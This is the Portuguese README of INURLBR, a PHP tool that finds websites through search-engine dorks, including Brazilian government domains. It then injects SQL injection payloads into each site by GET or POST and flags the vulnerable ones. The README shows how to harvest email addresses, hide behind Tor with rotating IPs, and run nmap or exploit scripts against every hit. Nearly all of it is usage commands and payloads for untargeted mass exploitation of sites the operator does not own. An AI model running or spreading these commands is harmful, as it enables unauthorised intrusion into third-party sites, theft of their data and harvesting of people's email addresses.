SCANNER - INURLBR
===============

>Busca avançada em motores de busca, Possibilita desde analise com exploit GET/POST a captura de emails &amp; validação personalizada interna para cada alvo/url encontrada.

>
 * GRUPO GOOGLEINURL BRASIL - PESQUISA AVANÇADA.
 * SCRIPT NAME: INURLBR
 * AUTOR:    Cleiton Pinheiro
 * Nick:     Googleinurl
 * Blog:     http://blog.inurl.com.br
 * twitter: /@googleinurl
 * facebook: /InurlBrasil
 * Versão:  1.0
 * php5-curl           LIB
 * php5-cli            LIB  
 * cURL support        enabled
 * cURL Information    7.24.0
 * Apache              2.4
 * allow_url_fopen     On
 * permission          Reading & Writing
 * User                root privilege, or is in the sudoers group
 * Operating system    LINUX
 * Proxy random        TOR        

 * Opções disponíveis: 

- Ajuda/Help:
------
```
./inurlbr.php --ajuda
./inurlbr.php --help
./inurlbr.php -h
```
- Opções:
------
```
 
-h       Ajuda
--help   Ajuda
--ajuda  Ajuda
-q  Define motor de busca 1,2,3,4,5,6,7,8,9,10,11,12,13,all cada número é referente um motor.
    [opções]:
    1   - www.google.com.br
    2   - www.bing.com
    3   - br.search.yahoo.com
    4   - www.ask.com
    5   - search.hao123.com.br
    6   - ajax.googleapis.com
    7   - search.lycos.com
    8   - busca.uol.com.br
    9   - us.yhs4.search.yahoo.com
    10  - pesquisa.sapo.pt
    11  - www.dmoz.org
    12  - www.gigablast.com
    all - todos motores de busca
    Default:    1
    Exemplo: -q {op}
    Uso:     -q 1
             -q 5
              Múltiplos motores  -q 1,2,5,6,11
              Todos motores      -q all
   
-p  Define proxy para camuflagem envio de request para o motor de busca e para alvo-exploit.
    Exemplo: -p {proxy:porta}
    Uso:     -p localhost:8118
             -p socks5://googleinurl@localhost:9050
             -p http://admin:12334@172.16.0.90:8080
 
--tor-random habilita a função tor randômico, a cada execução do script o tor muda de ip.
 
-t  Define que tipo de validação o script vai efetuar op 1,2,3
    [opções]:
    1   - Tipo 1 valida erros padrões do script
    injeta & concatena exploit apartir do host & gets.
    demonstrativo: www.alvo.com.br/pasta/index.php?id={exploit}
 
    2   -  Tipo 2 valida o erro definido na opção -a='ALGO_DENTRO_ALVO'
    injeta & concatena exploit apartir do host & gets.
    demonstrativo: www.alvo.com.br/pasta/index.php?id={exploit}
   
    3   - Tipo 3 valida erro definido na opção -a='ALGO_DENTRO_ALVO' & erros padrão script.
    injeta & concatena exploit apartir do host.
    demonstrativo: www.alvo.com.br{exploit}
    Default:    1
    Exemplo: -t {op}
    Uso:     -t 1
   
    ERRO PADRÃO SCRIPT:  
    ERRO MYSQL,ERRO MICROSOFT,ERRO ORACLE,ERRO POSTGRESQL,
    ZEND FRAMEWORK,ERRO PHP,ERRO ASP,ERRO LUA,ERRO INDEFINIDOS
 
--dork Define a dork que vai ser buscada nos motores.
    Exemplo: --dork {dork}
    Uso:     --dork 'site:.gov.br inurl:php? id'
    - Usando múltiplas dorks.
    Exemplo: --dork {[DORK]dork1[DORK]dork2[DORK]dork3}
    Uso:     --dork '[DORK]site:br[DORK]site:ar inurl:php[DORK]site:il inurl:asp'
 
--exploit-get  Define exploit via get será injetado a cada URL encontrada.
    Exemplo: --exploit-get {exploit_get}
    Uso:     --exploit-get '?´0x27;'
   
--exploit-post Define exploit via post será injetado a cada URL encontrada.
    Exemplo: --exploit-post {exploit_post}
    Uso:     --exploit-post 'campo1=valor1&campo2=valor2&campo3=?´0x273exploit;&botao=ok'
   
-a  Define procurar string que será procurada dentro de cada URL encontrada.
    Exemplo: -a {string_procurada}
    Uso:     -a '<title>ola mundo</title>'
   
-d  Define o nível de debug na execução do script op 1,2,3,4,5,6
    Exemplo: -d {op}
    Uso:     -d 1 /URL motor de busca.
             -d 2 /Mostra toda url executada.
             -d 3 /Request detalhada de cada URL encontrada.
             -d 4 /Mostra html de cada url executada.
             -d 5 /Request detalhada de todas urls.
             
-s  Define arquivo de saida onde vai ser salvadas as URLS vulneráveis.
    Exemplo: -s {arquivo}
    Uso:     -s seu_arquivo.txt
   
-o  Define arquivo que vai possibilitar execucação de testes com base em arquivo,
    Sem motor de busca.
    Exemplo: -o {arquivo_minhas_urls}
    Uso:     -o testes.txt
 
-m  Habilita buscar lista de emais dentro das urls encontrdas.  
 
--comand-vul Executa comandos no terminal para cada URL encontrada vulnerável.
    Exemplo: --comand-vul {comando}
    Uso:     --comand-vul 'nmap sV -p 22,80,21 _TARGET_'
             --comand-vul './exploit.sh _TARGET_ output.txt'
             
--comand-all Executa comandos no terminal para todas URLS encontradas.
    Exemplo: --comand-all {comando}
    Uso:     --comand-all 'nmap sV -p 22,80,21 _TARGET_'
             --comand-all './exploit.sh _TARGET_ output.txt'
```

- Dando permição para execução do script:
------
```
$chmod +x inurlbr.php
Executar: ./inurlbr.php
```

- Efetuando pesquisa simples:
------
  * Comando --dork {sua_dork}
  * Comando -s    {resultados.txt}
  * Comando --exploit-get {exploit}
  * Comando -q {motor_de_busca}
```
./inurlbr.php --dork "site:br noticias php?id=" -s resultados.txt --exploit-get "?'0x27" -q all
```
- Efetuando pesquisa com múltiplas dorks:
------
  * Comando/simples   --dork {sua_dork}
  * Comando/múltiplas --dork {[DORK]sua_dork1[DORK]sua_dork2[DORK]sua_dork3}
```
./inurlbr.php --dork "[dork]site:br noticias php?id=[dork]site:ar noticias php?id=[dork]site:gov.br noticias php?id=" -s resultados.txt --exploit-get "?'0x27" -q all
```
- Efetuando pesquisa com um ou mais motores de busca:
------
  * Comando -q {motor_de_busca}
```
./inurlbr.php --dork "site:br noticias php?id=" -s resultados.txt --exploit-get "?'0x27" -q {OPÇÃO}
./inurlbr.php --dork "site:br noticias php?id=" -s resultados.txt --exploit-get "?'0x27" -q 5
./inurlbr.php --dork "site:br noticias php?id=" -s resultados.txt --exploit-get "?'0x27" -q 1,2,3,4
./inurlbr.php --dork "site:br noticias php?id=" -s resultados.txt --exploit-get "?'0x27" -q 12,11,7,1

```
- Definindo tipo de erro a ser validado:
------
  * Comando -t {op}
  * TIPO[1] Valida erros padrões do script injeta & concatena exploit apartir do host & gets.
```
demonstrativo: www.alvo.com.br/pasta/index.php?id={exploit}
demonstrativo: www.alvo.com.br/pasta/pasta2/list.php?menu=1&id={exploit}
```
   Procura dentro da url valores/erros padrões definidos internamente no script.
```
./inurlbr.php --dork "site:br noticias php?id=" -s resultados.txt --exploit-get "?'0x27" -q all -t 1
```
  * TIPO[2] Valida o erro definido na opção -a='ALGO_DENTRO_ALVO' injeta & concatena exploit apartir do host & gets.
```
demonstrativo: www.alvo.com.br/pasta/index.php?id={exploit}
```   
   Procura dentro da url valores/erros padrões definidos na opção -a 'ALGO_DENTRO_ALVO'           
   Ex: Quero encontrar a palavra "marighella" dentro das urls encontradas -a 'marighella'.
```
./inurlbr.php --dork "site:br noticias php?id=" -s resultados.txt --exploit-get "?'0x27" -q all -t 2 -a 'marighella'
```
  * TIPO[3] Valida erro definido na opção -a='ALGO_DENTRO_ALVO' & erros padrão script.
    injeta & concatena exploit apartir do host.
```
demonstrativo: www.alvo.com.br{exploit}
```
  >Procura dentro da url valores/erros padrões + valor opção -a 'ALGO_DENTRO_ALVO'           
   Ex: Quero encontrar a palavra "marighella" dentro das urls encontradas -a 'marighella'.
   Caso eu tenho um exploit que ao ser executado na url seja gerado um  erro/valor, assim o script procura pelo
   valor 'marighella' caso seja encontrado url/alvo é considerada possível vulnerável.
```  
Ex: Exploit = '/index.php?id=1+select+UNHEX(HEX(CONCAT_WS(0x3a,0x3A3A3A494E55524C3A3A3A)))+from+users
```     
   >Valor:0x3A3A3A494E55524C3A3A3A é a string '::::INURL::' convertida em hexadecimal.
   URL/ALVO encontrada pelo script:
```    
www.alvo.com.br/valores/casas.php?abrir=1
```    
   O script vai filtrar a url retornando somente o host + exploit, assim executando.
```   
www.alvo.com.br/index.php?id=1+select+UNHEX(HEX(CONCAT_WS(0x3a,0x3A3A3A494E55524C3A3A3A)))+from+users
```   
   >Como vamos saber se foi explorado com sucesso ?
   Definindo o valor -a '::::INURL::', caso esse valor apareça na url executada é passível de vulnerabilidade.
Ex:   
```   
./inurlbr.php --dork "site:br noticias php?id=" -s resultados.txt 
--exploit-get "/index.php?id=1+select+UNHEX(HEX(CONCAT_WS(0x3a,0x3A3A3A494E55524C3A3A3A)))+from+users" 
-q all -t 3 -a '::::INURL::'
```    
   
Caso queira procurar por sites que usam CMS 'Joomla! 1.5':
Ex:   
```   
./inurlbr.php --dork 'site:br "How do I install Joomla! 1.5?"' -s resultados.txt  -q all -t 3 -a 'Joomla! 1.5'
``` 
- Definindo exploit GET/POST.
-----
  * Comando --exploit-get {exploit}
  * --exploit-get  Define exploit via get será injetado a cada URL encontrada.
```
Exemplo: --exploit-get {exploit_get}
Uso:     --exploit-get '?´0x27;'
         demonstrativo: www.alvo.com.br/pasta/index.php?id={exploit-get}
         demonstrativo: www.alvo.com.br/pasta/pasta2/list.php?menu=1&id={exploit-get}
```
  * Comando --exploit-post {exploit}
  * --exploit-post Define exploit via post será injetado a cada URL encontrada.

```
Exemplo: --exploit-post {exploit_post}
Uso:     --exploit-post 'campo1=valor1&campo2=valor2&campo3=?´0x273exploit;&botao=ok'
         demonstrativo: www.alvo.com.br/pasta/index.php VIA POST {exploit-post}
         demonstrativo: www.alvo.com.br/pasta/pasta2/list.php VIA POST {exploit-post}
```
- Definindo valor personalizado que deve ser procurado dentro de cada URL/ALVO:
-----
  * Comando -a {valor_procurado}
  * -a  Define string que será procurada dentro de cada URL encontrada.
```
Exemplo: -a {string_procurada}
Uso:     -a '<title>Ola dorkeiro</title>'
         demonstrativo: -a 'Joomla! 1.5'
         demonstrativo: -a 'Prefeitura - '
         demonstrativo: -a 'maria'
         demonstrativo: -a '23423423423523'
```
- Definindo arquivo que vai ser nossa base de URL's, sem a necesidade de busca com motores:
-----
  * Comando -a {arquivo_urls.txt}
  * -o  Define arquivo que vai possibilitar execucação de testes com base em arquivo.
```  
Sem motor de busca.
Exemplo: -o {arquivo_minhas_urls}
Uso:     -o testes.txt
demonstrativo arquivo formatado:
         www.alvo1.com.br/pasta2/pasta2/list2.php?menu=1&id=423423
         www.alvo2.com.br/pasta/list.php?menu3=1&id=23
         www.alvo3.com.br/pasta2/list.php?menu=1&id=2345
         www.alvo4.com.br/pasta/pasta2/list2.php?menu=1&id=3
         www.alvo7.com.br/pasta/pasta2/list.php?menu=1&id=2
         www.alvo0.com.br/arquivo/pasta2/index.php?menu_id=1&id=1
```    
   >Essas urls serão caregadas no scripts para testes de acordo com os parâmetros passados.
   
 - Definindo busca de emails:
-----
  * Comando -m
  * -m  Habilita buscar lista de emais dentro das urls encontrdas.
``` 
/inurlbr.php --dork '@gmail @mail ext:txt' -s resultados.txt  -q all -m
``` 
 - Definindo proxy/tor:
-----
  * Comando -p {proxy}
  * -p  Define proxy para camuflagem envio de request para o motor de busca e para alvo-exploit.
```   
Exemplo: -p {proxy}
Uso:     -p localhost:8118
         -p socks5://googleinurl@localhost:9050
         -p http://admin:12334@172.16.0.90:8080
``` 
 - Definindo proxy-random:
-----
  * Comando --tor-random
  * --tor-random habilita a função tor randômico, a cada execução do script o tor muda de ip.

>
Esse comando só é executado caso tenha preenchido a opção -p {proxy}.
Para que tal função tenha funcionamento deve-se instalar o aplivativo tor.
A cada execução nova do script seu ip na rede TOR será renovado.
Ajuda:                                                                                    
- https://www.torproject.org/docs/debian.html.en
- http://www.privoxy.org/

 - Definindo comando externo:
-----
  * Comando --comand-vul {comando_terminal}
  * --comand-vul Executa comandos no terminal para cada URL encontrada vulnerável.
```  
    Exemplo: --comand-vul {comando}
    Uso:     --comand-vul 'nmap sV -p 22,80,21 _TARGET_'
             --comand-vul './exploit.sh _TARGET_ output.txt'
             --comand-vul 'pint -c 1 _TARGET_ >> output.txt'
```
  * Comando --comand-all {comando_terminal}
  * --comand-all Executa comandos no terminal para todas URLS encontradas.
```    
    Exemplo: --comand-all {comando}
    Uso:     --comand-all 'nmap sV -p 22,80,21 _TARGET_'
             --comand-all './exploit.sh _TARGET_ output.txt'
             --comand-vul 'pint -c 1 _TARGET_ >> output.txt'
```               
